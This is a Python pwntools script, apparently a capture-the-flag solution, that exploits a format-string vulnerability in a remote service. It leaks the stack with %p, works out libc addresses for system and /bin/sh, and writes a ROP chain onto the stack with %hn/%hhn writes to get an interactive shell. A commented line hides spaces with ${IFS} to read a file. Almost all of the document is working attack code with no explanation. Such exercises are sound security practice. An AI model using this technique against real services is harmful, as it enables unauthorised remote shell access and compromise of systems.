from pwn import *
context.encoding = 'ASCII'
p = remote('portal.hackazon.org', 17004)
print('Connected!')

def query(strs):
    if not isinstance(strs, list): strs = [strs]
    p.sendline('\n'.join(strs).encode())
    for str in strs:
        p.recvuntil('Running command (')
        result = p.recvuntil(') now on engine.\n', True)
    return result

stack = [0] + [int(x,16) for x in query('%p'*99).replace(b'(nil)', b'0x0').split(b'0x')[1:]]
#print(' '.join(x.to_bytes(8, 'little').hex(' ') for x in stack)) # dump the stack

print(query('%75$s'))

# get all the libc methods
libc_base = stack[35] - 0x21bf7
print(f'libc_base = {libc_base:x}')#
poprdi = libc_base + 0x22203
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a

p37 = stack[37]
p63 = stack[63]

print(f'p37={p37:x}')
print(f'p63={p63:x}')
zeroOffset = p37 - 63 * 8

assert p37 + 8 >> 16 == p63 >> 16, 'Stack not aligned the way we wanted'

def getstr(len):
    return '' if len == 0 else f'%{len}c'  # gets a string of the correct length for %n to print out

def writetmp(val): #val is 64-bit, this gets written into parameter 64
    addr = p37 + 8
    q1 = [f'{getstr(addr & 0xff00)}%37$hn']
    q2 = [x for i in range(8)[::-1] for x in (f'{getstr((addr + i) & 0xff)}%37$hhn', f'{getstr((val >> (i * 8)) & 0xff)}%63$hhn')]
    query(q1 + q2)

def offset_to_address(offset):
    return zeroOffset + offset * 8

def poke(addr, val): #addr is 8-byte aligned, val is 64-bit
    writetmp(addr)
    query([x for i in range(8) for x in (f'{getstr((addr + i) & 0xff)}%63$hhn', f'{getstr((val >> (i * 8)) & 0xff)}%64$hhn')])

def poke_offset(offset, val):
    poke(offset_to_address(offset), val)

poke_offset(35, poprdi)
poke_offset(36, binsh)
# we leave 37 untouched, it will be popped into rbp
poke_offset(38, system)

writetmp(offset_to_address(5)) # addr at 5
p.sendline(f'%{0x804}c%64$hnFINISH')
p.recvuntil('FINISH')
print('Shell obtained!')

p.interactive()
#p.sendline('cat${IFS}y*')
#print(p.readline())
